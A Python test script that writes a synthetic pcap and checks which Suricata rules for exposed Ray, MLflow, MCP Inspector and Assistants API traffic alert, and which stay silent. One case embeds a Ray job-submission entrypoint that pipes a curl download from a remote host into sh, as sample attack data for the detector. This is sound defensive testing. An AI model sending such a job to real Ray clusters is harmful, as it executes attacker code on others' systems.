#!/usr/bin/env python3
"""Replay synthetic traffic through the Suricata rules and check which fire.

`suricata -T` only proves a rule parses. Five rules in this pack parsed for
months and could never alert: four server-response rules whose header named
the service port as the *destination* of a packet that travels from it, and
one that looked for a port in `http.host`, which Suricata strips. A syntax
check cannot see either, so this replays one small HTTP exchange per case and
asserts the expected SIDs alert - and, for controls, that they stay quiet.

Standard library only. The pcap is written by hand so the test needs nothing
but Suricata itself:

    python tests/suricata_replay.py            # run every case
    python tests/suricata_replay.py --keep DIR # keep the pcap and eve.json

All traffic is synthetic and uses documentation address ranges. No payload
here is an exploit: each request carries only the strings a rule matches on.
"""
from __future__ import annotations

import argparse
import json
import shutil
import socket
import struct
import subprocess
import sys
import tempfile
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
EXTERNAL = "203.0.113.5"     # TEST-NET-3: outside the default HOME_NET
INTERNAL = "10.0.0.5"        # inside it
CLIENT_IN = "10.0.0.20"


def _csum(data: bytes) -> int:
    if len(data) % 2:
        data += b"\0"
    total = sum(struct.unpack("!%dH" % (len(data) // 2), data))
    total = (total >> 16) + (total & 0xFFFF)
    total += total >> 16
    return ~total & 0xFFFF


def _packet(src: str, dst: str, sport: int, dport: int, seq: int, ack: int,
            flags: int, data: bytes = b"") -> bytes:
    tcp = struct.pack("!HHIIBBHHH", sport, dport, seq, ack, 5 << 4, flags, 65535, 0, 0) + data
    pseudo = socket.inet_aton(src) + socket.inet_aton(dst) + struct.pack("!BBH", 0, 6, len(tcp))
    tcp = tcp[:16] + struct.pack("!H", _csum(pseudo + tcp)) + tcp[18:]
    ip = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 20 + len(tcp), 1, 0, 64, 6, 0,
                     socket.inet_aton(src), socket.inet_aton(dst))
    ip = ip[:10] + struct.pack("!H", _csum(ip)) + ip[12:]
    return b"\x00\x11\x22\x33\x44\x55" + b"\x66\x77\x88\x99\xaa\xbb" + b"\x08\x00" + ip + tcp


def session(client: str, server: str, cport: int, sport: int, request: bytes,
            response: bytes) -> list[bytes]:
    """One complete TCP conversation: handshake, request, response, teardown."""
    a, b = 1000, 5000
    out = [_packet(client, server, cport, sport, a, 0, 0x02),
           _packet(server, client, sport, cport, b, a + 1, 0x12),
           _packet(client, server, cport, sport, a + 1, b + 1, 0x10)]
    a, b = a + 1, b + 1
    out.append(_packet(client, server, cport, sport, a, b, 0x18, request))
    a += len(request)
    out.append(_packet(server, client, sport, cport, b, a, 0x18, response))
    b += len(response)
    out += [_packet(client, server, cport, sport, a, b, 0x11),
            _packet(server, client, sport, cport, b, a + 1, 0x11),
            _packet(client, server, cport, sport, a + 1, b + 1, 0x10)]
    return out


def http_request(method: str, host: str, path: str, body: bytes = b"",
                 headers: bytes = b"") -> bytes:
    head = f"{method} {path} HTTP/1.1\r\nHost: {host}\r\n".encode() + headers
    if body:
        head += b"Content-Type: application/json\r\nContent-Length: %d\r\n" % len(body)
    return head + b"\r\n" + body


def http_response(body: bytes, ctype: bytes = b"text/html") -> bytes:
    return (b"HTTP/1.1 200 OK\r\nContent-Type: " + ctype +
            b"\r\nContent-Length: %d\r\n\r\n" % len(body) + body)


# Each case is one conversation. `fires` must all alert on it; `silent` must not.
# Cases get distinct client ports, which is how alerts are attributed back.
CASES = [
    {
        "name": "Ray dashboard page served from port 8265",
        "client": EXTERNAL, "server": INTERNAL, "sport": 8265,
        "request": http_request("GET", f"{INTERNAL}:8265", "/"),
        "response": http_response(b"<html><title>Ray Dashboard</title></html>"),
        "fires": [9000210],
    },
    {
        "name": "Ray jobs API reached from an external address",
        "client": EXTERNAL, "server": INTERNAL, "sport": 8265,
        "request": http_request("GET", f"{INTERNAL}:8265", "/api/jobs/"),
        "response": http_response(b"[]", b"application/json"),
        "fires": [9000201, 9000206],
    },
    {
        "name": "Ray jobs API reached from inside (control)",
        "client": CLIENT_IN, "server": INTERNAL, "sport": 8265,
        "request": http_request("GET", f"{INTERNAL}:8265", "/api/jobs/"),
        "response": http_response(b"[]", b"application/json"),
        "fires": [9000201], "silent": [9000206],
    },
    {
        "name": "Ray job submission whose entrypoint fetches a remote script",
        "client": EXTERNAL, "server": INTERNAL, "sport": 8265,
        "request": http_request("POST", f"{INTERNAL}:8265", "/api/jobs/",
                                b'{"entrypoint": "bash -c \'curl http://198.51.100.7/x.sh | sh\'"}'),
        "response": http_response(b'{"job_id":"raysubmit_1"}', b"application/json"),
        "fires": [9000200, 9000206],
    },
    {
        "name": "MLflow UI served from port 5000",
        "client": EXTERNAL, "server": INTERNAL, "sport": 5000,
        "request": http_request("GET", f"{INTERNAL}:5000", "/"),
        "response": http_response(b"<html><head><title>MLflow</title></head></html>"),
        "fires": [9000106],
    },
    {
        "name": "MCP Inspector UI served from port 6274",
        "client": CLIENT_IN, "server": INTERNAL, "sport": 6274,
        "request": http_request("GET", f"{INTERNAL}:6274", "/"),
        "response": http_response(b'<script src="/@modelcontextprotocol/inspector/app.js"></script>'),
        "fires": [9000003],
    },
    {
        "name": "Assistants API response carrying a command verb (intercepted)",
        "client": CLIENT_IN, "server": EXTERNAL, "sport": 80,
        "request": http_request("GET", "api.openai.com", "/v1/assistants"),
        "response": http_response(b'{"data":[{"description":"Payload","instructions":"..."}]}',
                                  b"application/json"),
        "fires": [9000800, 9000801],
    },
    {
        "name": "Ordinary web page from an unrelated port (control)",
        "client": CLIENT_IN, "server": EXTERNAL, "sport": 80,
        "request": http_request("GET", "example.com", "/"),
        "response": http_response(b"<html><title>Hello</title></html>"),
        "silent": [9000003, 9000106, 9000206, 9000210, 9000801],
    },
]


def build(workdir: Path) -> tuple[Path, Path]:
    packets: list[bytes] = []
    for i, case in enumerate(CASES):
        case["cport"] = 40001 + i
        packets += session(case["client"], case["server"], case["cport"], case["sport"],
                           case["request"], case["response"])
    pcap = workdir / "replay.pcap"
    with pcap.open("wb") as fh:
        fh.write(struct.pack("<IHHiIII", 0xA1B2C3D4, 2, 4, 0, 0, 65535, 1))
        for i, pkt in enumerate(packets):
            fh.write(struct.pack("<IIII", 1700000000 + i, 0, len(pkt), len(pkt)) + pkt)
    rules = workdir / "combined.rules"
    rules.write_text("".join(p.read_text(encoding="utf-8") + "\n"
                             for p in sorted(ROOT.glob("0*/*.rules"))), encoding="utf-8")
    return pcap, rules


def run(workdir: Path) -> dict[int, set[int]]:
    pcap, rules = build(workdir)
    proc = subprocess.run(["suricata", "-r", str(pcap), "-S", str(rules), "-l", str(workdir),
                           "-k", "none"], capture_output=True, text=True)
    if proc.returncode != 0:
        sys.exit("suricata failed:\n" + proc.stdout + proc.stderr)
    fired: dict[int, set[int]] = {}
    for line in (workdir / "eve.json").read_text(encoding="utf-8").splitlines():
        event = json.loads(line)
        if event.get("event_type") != "alert":
            continue
        ports = {event.get("src_port"), event.get("dest_port")}
        for case in CASES:
            if case["cport"] in ports:
                fired.setdefault(case["cport"], set()).add(event["alert"]["signature_id"])
    return fired


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument("--keep", metavar="DIR", help="write the pcap and Suricata output here and keep them")
    args = ap.parse_args()
    if not shutil.which("suricata"):
        sys.exit("suricata is not installed")
    workdir = Path(args.keep) if args.keep else Path(tempfile.mkdtemp(prefix="suricata-replay-"))
    workdir.mkdir(parents=True, exist_ok=True)
    try:
        fired = run(workdir)
    finally:
        if not args.keep:
            shutil.rmtree(workdir, ignore_errors=True)
    problems = 0
    for case in CASES:
        got = fired.get(case["cport"], set())
        missing = [s for s in case.get("fires", []) if s not in got]
        unexpected = [s for s in case.get("silent", []) if s in got]
        status = "ok  " if not (missing or unexpected) else "FAIL"
        print(f"[{status}] {case['name']}: fired {sorted(got) or 'nothing'}")
        if missing:
            print(f"         expected and did not fire: {missing}")
        if unexpected:
            print(f"         fired and should not have: {unexpected}")
        problems += bool(missing or unexpected)
    print(f"\n{len(CASES)} case(s), {problems} problem(s).")
    return 1 if problems else 0


if __name__ == "__main__":
    sys.exit(main())
